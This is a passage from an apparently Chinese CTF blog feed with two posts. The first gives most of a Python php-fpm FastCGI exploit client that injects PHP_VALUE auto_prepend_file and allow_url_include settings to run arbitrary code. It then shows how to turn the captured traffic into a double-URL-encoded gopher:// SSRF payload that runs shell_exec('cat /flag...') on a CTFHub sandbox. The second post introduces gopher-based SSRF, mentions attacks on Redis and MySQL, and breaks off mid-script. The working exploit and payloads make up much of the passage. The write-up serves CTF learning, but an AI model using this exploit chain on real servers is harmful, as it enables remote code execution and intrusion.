class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token keyword">if</span> post<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SEND        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__waitForResponse<span class="token punctuation">(</span>requestId<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> len<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            data <span class="token operator">+=</span> buf        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> response<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \                    <span class="token operator">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR                <span class="token keyword">if</span> requestId <span class="token operator">==</span> int<span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:{} port:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php or /usr/local/lib/php/PEAR.php'</span><span class="token punctuation">)</span>      parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'&lt;?php phpinfo(); exit; ?>'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>    uri <span class="token operator">=</span> args<span class="token punctuation">.</span>file    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>force_text<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以<code>py fpm.py host path -c [php语句] -p port</code>格式执行即可</p><p>接下来实现一下，便可以基本理解对FastCGI协议的攻击原理了</p><p><strong>第一步，构造攻击流量</strong></p><p>使用脚本对本地9000端口发出攻击流量，监听本地9000端口并把流量抓下来</p><p><img src="/img/image-20210216173741236.png" alt="image-20210216173741236"></p><p>将监听到的流量输出到output.txt文件中</p><p>发起攻击</p><p><img src="/img/image-20210216173958337.png" alt="image-20210216173958337"></p><p>查看output.txt</p><p><img src="/img/image-20210216174119274.png" alt="image-20210216174119274"></p><p>是乱码，因为TCP流是二进制数据</p><p>随便用什么方式把其中的16进制数据拷贝出来，我使用了HxD</p><p><img src="/img/image-20210216174316964.png" alt="image-20210216174316964"></p><p>把16进制数据拷贝下来</p><p>转成url编码</p><p>可以写脚本解决</p><pre class="line-numbers language-python"><code class="language-python">hex<span class="token operator">=</span><span class="token string">"01 01 36 20 00 08 00 00 00 01 00 00 00 00 00 00 01 04 36 20 01 E7 00 00 11 0B 47 41 54 45 57 41 59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43 47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F 4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49 50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E 41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00 51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45 51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52 4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46 54 57 41 52 45 70 68 70 2F 66 63 67 69 63 6C 69 65 6E 74 0B 09 52 45 4D 4F 54 45 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31 0B 04 52 45 4D 4F 54 45 5F 50 4F 52 54 39 39 38 35 0B 09 53 45 52 56 45 52 5F 41 44 44 52 31 32 37 2E 30 2E 30 2E 31 0B 02 53 45 52 56 45 52 5F 50 4F 52 54 38 30 0B 09 53 45 52 56 45 52 5F 4E 41 4D 45 6C 6F 63 61 6C 68 6F 73 74 0F 08 53 45 52 56 45 52 5F 50 52 4F 54 4F 43 4F 4C 48 54 54 50 2F 31 2E 31 0C 10 43 4F 4E 54 45 4E 54 5F 54 59 50 45 61 70 70 6C 69 63 61 74 69 6F 6E 2F 74 65 78 74 0E 02 43 4F 4E 54 45 4E 54 5F 4C 45 4E 47 54 48 37 36 09 1F 50 48 50 5F 56 41 4C 55 45 61 75 74 6F 5F 70 72 65 70 65 6E 64 5F 66 69 6C 65 20 3D 20 70 68 70 3A 2F 2F 69 6E 70 75 74 0F 16 50 48 50 5F 41 44 4D 49 4E 5F 56 41 4C 55 45 61 6C 6C 6F 77 5F 75 72 6C 5F 69 6E 63 6C 75 64 65 20 3D 20 4F 6E 01 04 36 20 00 00 00 00 01 05 36 20 00 4C 00 00 3C 3F 70 68 70 20 76 61 72 5F 64 75 6D 70 28 73 68 65 6C 6C 5F 65 78 65 63 28 27 63 61 74 20 2F 66 6C 61 67 5F 38 36 34 34 64 39 62 36 37 65 65 61 66 36 62 30 32 63 65 31 36 34 65 30 34 31 34 35 35 34 37 31 27 29 29 3B 20 3F 3E 01 05 36 20 00 00 00 00"</span>a<span class="token operator">=</span>hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token string">''</span>length<span class="token operator">=</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b<span class="token operator">+=</span><span class="token string">'%'</span>    b<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    b<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出url编码</p><pre><code>%01%01%DC%C5%00%08%00%00%00%01%00%00%00%00%00%00%01%04%DC%C5%01%E7%00%00%11%0B%47%41%54%45%57%41%59%5F%49%4E%54%45%52%46%41%43%45%46%61%73%74%43%47%49%2F%31%2E%30%0E%04%52%45%51%55%45%53%54%5F%4D%45%54%48%4F%44%50%4F%53%54%0F%1B%53%43%52%49%50%54%5F%46%49%4C%45%4E%41%4D%45%2F%75%73%72%2F%6C%6F%63%61%6C%2F%6C%69%62%2F%70%68%70%2F%50%45%41%52%2E%70%68%70%0B%1B%53%43%52%49%50%54%5F%4E%41%4D%45%2F%75%73%72%2F%6C%6F%63%61%6C%2F%6C%69%62%2F%70%68%70%2F%50%45%41%52%2E%70%68%70%0C%00%51%55%45%52%59%5F%53%54%52%49%4E%47%0B%1B%52%45%51%55%45%53%54%5F%55%52%49%2F%75%73%72%2F%6C%6F%63%61%6C%2F%6C%69%62%2F%70%68%70%2F%50%45%41%52%2E%70%68%70%0D%01%44%4F%43%55%4D%45%4E%54%5F%52%4F%4F%54%2F%0F%0E%53%45%52%56%45%52%5F%53%4F%46%54%57%41%52%45%70%68%70%2F%66%63%67%69%63%6C%69%65%6E%74%0B%09%52%45%4D%4F%54%45%5F%41%44%44%52%31%32%37%2E%30%2E%30%2E%31%0B%04%52%45%4D%4F%54%45%5F%50%4F%52%54%39%39%38%35%0B%09%53%45%52%56%45%52%5F%41%44%44%52%31%32%37%2E%30%2E%30%2E%31%0B%02%53%45%52%56%45%52%5F%50%4F%52%54%38%30%0B%09%53%45%52%56%45%52%5F%4E%41%4D%45%6C%6F%63%61%6C%68%6F%73%74%0F%08%53%45%52%56%45%52%5F%50%52%4F%54%4F%43%4F%4C%48%54%54%50%2F%31%2E%31%0C%10%43%4F%4E%54%45%4E%54%5F%54%59%50%45%61%70%70%6C%69%63%61%74%69%6F%6E%2F%74%65%78%74%0E%02%43%4F%4E%54%45%4E%54%5F%4C%45%4E%47%54%48%33%38%09%1F%50%48%50%5F%56%41%4C%55%45%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%20%3D%20%70%68%70%3A%2F%2F%69%6E%70%75%74%0F%16%50%48%50%5F%41%44%4D%49%4E%5F%56%41%4C%55%45%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%20%3D%20%4F%6E%01%04%DC%C5%00%00%00%00%01%05%DC%C5%00%26%00%00%3C%3F%70%68%70%20%76%61%72%5F%64%75%6D%70%28%73%68%65%6C%6C%5F%65%78%65%63%28%27%6C%73%20%2F%27%29%29%3B%20%3F%3E%01%05%DC%C5%00%00%00%00</code></pre><p>这就是gopher协议的主体内容了，用它构造payload，记得还要再url编码一次。端口是fpm服务默认的9000</p><pre><code>http://challenge-605c3873bacccb09.sandbox.ctfhub.com:10080/?url=gopher://127.0.0.1:9000/_%2501%2501%2536%2520%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2536%2520%2501%25E7%2500%2500%2511%250B%2547%2541%2554%2545%2557%2541%2559%255F%2549%254E%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252F%2531%252E%2530%250E%2504%2552%2545%2551%2555%2545%2553%2554%255F%254D%2545%2554%2548%254F%2544%2550%254F%2553%2554%250F%251B%2553%2543%2552%2549%2550%2554%255F%2546%2549%254C%2545%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250B%251B%2553%2543%2552%2549%2550%2554%255F%254E%2541%254D%2545%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250C%2500%2551%2555%2545%2552%2559%255F%2553%2554%2552%2549%254E%2547%250B%251B%2552%2545%2551%2555%2545%2553%2554%255F%2555%2552%2549%252F%2575%2573%2572%252F%256C%256F%2563%2561%256C%252F%256C%2569%2562%252F%2570%2568%2570%252F%2550%2545%2541%2552%252E%2570%2568%2570%250D%2501%2544%254F%2543%2555%254D%2545%254E%2554%255F%2552%254F%254F%2554%252F%250F%250E%2553%2545%2552%2556%2545%2552%255F%2553%254F%2546%2554%2557%2541%2552%2545%2570%2568%2570%252F%2566%2563%2567%2569%2563%256C%2569%2565%256E%2574%250B%2509%2552%2545%254D%254F%2554%2545%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2504%2552%2545%254D%254F%2554%2545%255F%2550%254F%2552%2554%2539%2539%2538%2535%250B%2509%2553%2545%2552%2556%2545%2552%255F%2541%2544%2544%2552%2531%2532%2537%252E%2530%252E%2530%252E%2531%250B%2502%2553%2545%2552%2556%2545%2552%255F%2550%254F%2552%2554%2538%2530%250B%2509%2553%2545%2552%2556%2545%2552%255F%254E%2541%254D%2545%256C%256F%2563%2561%256C%2568%256F%2573%2574%250F%2508%2553%2545%2552%2556%2545%2552%255F%2550%2552%254F%2554%254F%2543%254F%254C%2548%2554%2554%2550%252F%2531%252E%2531%250C%2510%2543%254F%254E%2554%2545%254E%2554%255F%2554%2559%2550%2545%2561%2570%2570%256C%2569%2563%2561%2574%2569%256F%256E%252F%2574%2565%2578%2574%250E%2502%2543%254F%254E%2554%2545%254E%2554%255F%254C%2545%254E%2547%2554%2548%2537%2536%2509%251F%2550%2548%2550%255F%2556%2541%254C%2555%2545%2561%2575%2574%256F%255F%2570%2572%2565%2570%2565%256E%2564%255F%2566%2569%256C%2565%2520%253D%2520%2570%2568%2570%253A%252F%252F%2569%256E%2570%2575%2574%250F%2516%2550%2548%2550%255F%2541%2544%254D%2549%254E%255F%2556%2541%254C%2555%2545%2561%256C%256C%256F%2577%255F%2575%2572%256C%255F%2569%256E%2563%256C%2575%2564%2565%2520%253D%2520%254F%256E%2501%2504%2536%2520%2500%2500%2500%2500%2501%2505%2536%2520%2500%254C%2500%2500%253C%253F%2570%2568%2570%2520%2576%2561%2572%255F%2564%2575%256D%2570%2528%2573%2568%2565%256C%256C%255F%2565%2578%2565%2563%2528%2527%2563%2561%2574%2520%252F%2566%256C%2561%2567%255F%2538%2536%2534%2534%2564%2539%2562%2536%2537%2565%2565%2561%2566%2536%2562%2530%2532%2563%2565%2531%2536%2534%2565%2530%2534%2531%2534%2535%2535%2534%2537%2531%2527%2529%2529%253B%2520%253F%253E%2501%2505%2536%2520%2500%2500%2500%2500</code></pre><p>执行后返回了服务器的根目录，里面有个“flag_8644d9b67eeaf6b02ce164e041455471”</p><p><img src="/img/image-20210216174730443.png" alt="image-20210216174730443"></p><p>那么只要将执行脚本时输入的php语句换成<code>&lt;?php var_dump(shell_exec("cat /flag_8644d9b67eeaf6b02ce164e041455471")) ?&gt;</code>,然后再重复一遍以上过程就可以了</p><p><img src="/img/image-20210216175215810.png" alt="image-20210216175215810"></p><p>这样就拿到了flag</p><p>总结流程：</p><p><strong>1.探测开放端口（这道题不用）</strong></p><p><strong>2.本地构造攻击流量，通过监听端口然后url转码的形式</strong></p><p><strong>3.ssrf攻击</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf入门，初识gopher协议</title>
      <link href="/2021/02/10/2021-2-7-ssrf-ru-men-chu-shi-gopher-xie-yi/"/>
      <url>/2021/02/10/2021-2-7-ssrf-ru-men-chu-shi-gopher-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="初识gopher协议"><a href="#初识gopher协议" class="headerlink" title="初识gopher协议"></a>初识gopher协议</h1><h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><blockquote><ul><li><code>gopher</code>协议是一种信息查找系统，他将<code>Internet</code>上的文件组织成某种索引，方便用户从<code>Internet</code>的一处带到另一处。在<code>WWW</code>出现之前，<code>Gopher</code>是<code>Internet</code>上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<code>tcp70</code>端口。但在<code>WWW</code>出现后，<code>Gopher</code>失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</li><li>它只支持文本，不支持图像</li></ul></blockquote><p>以上为通用简介</p><p>为什么使用Gopher协议</p><blockquote><p>gopher 协议功能很强大<br>它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。<br>gopher 协议使用tcp 可靠连接。</p></blockquote><h3 id="Gopher协议格式"><a href="#Gopher协议格式" class="headerlink" title="Gopher协议格式"></a>Gopher协议格式</h3><p>Gopher默认端口是70：</p><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></pre><p><code>&lt;gopher-path&gt;</code>可以是下面其中之一的格式：</p><pre><code>&lt;gophertype&gt;&lt;selector&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher+_string&gt;</code></pre><p>如果省略<code>&lt;port&gt;</code>，则端口默认为70。<code>&lt;gophertype&gt;</code>是一个单字符字段，表示URL所引用资源的Gopher类型。</p><p>整个<code>&lt;gopher-path&gt;</code>也可以为空，在这种情况下，定界“/”也是可以为空，并且<code>&lt;gophertype&gt;</code>默认为“ 1”。</p><p><code>&lt;selector&gt;</code>是Gopher选择器字符串。在Gopher协议中，Gopher选择器字符串是一个八位字节序列，可以包含除09十六进制（US-ASCIIHT或制表符），0A十六进制（US-ASCII字符LF）和0D（US-ASCII字符CR）之外的任何八位字节。</p><p><code>&lt;search&gt;</code>用于向gopher 搜索引擎提交搜索数据，和<code>&lt;selector&gt;</code>之间用%09隔开。</p><p>Gopher客户端通过将Gopher<code>&lt;selector&gt;</code>字符串发送到Gopher服务器来指定要检索的项目。</p><p>简单来说，就是</p><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流        // /&lt;gopher-path&gt;可以不要，TCP流前面的_可以是任何字符都没有问题，但是一定要有</code></pre><p>我们可以使用<code>curl</code>工具来发送gopher协议的的payload，但是最新的curl已经不接受gopher协议，这个7.60版本的</p><p>只要设置好环境变量就可以使用了，懂得都懂</p><p>Gopher协议有专门的编码方式</p><p>构造符合Gopher协议的TCP流有两种方式，一是wireshark抓包，然后还原原始数据，转成hex编码，再在每两个字符前加上一个%即可。</p><p>二是使用Burpsuite抓包，然后把必要的数据复制下来，按编码转换规制转换一下即可</p><p><strong>转换规则</strong></p><blockquote><p>1.如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</p><p>2.如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</p><p>3.<strong>将\r字符串，即第一次url编码之后所有的%0a替换成%0d%0a。</strong></p><p>4.空白行替换为%0a。</p><p>5.问号需要转码为URL编码%3f，同理空格转换成%20。</p><p>6.在HTTP包的最后要加%0d%0a，代表消息结束。</p></blockquote><p>这里有一个PY脚本可以用来转换bp抓包的数据</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parsetest <span class="token operator">=</span>\<span class="token triple-quoted-string string">"""GET /get.php HTTP/1.1Host: 192.168.0.111"""</span>  <span class="token comment" spellcheck="true">#注意后面一定要有回车，回车结尾表示http请求结束</span>tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>test<span class="token punctuation">)</span>new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>result <span class="token 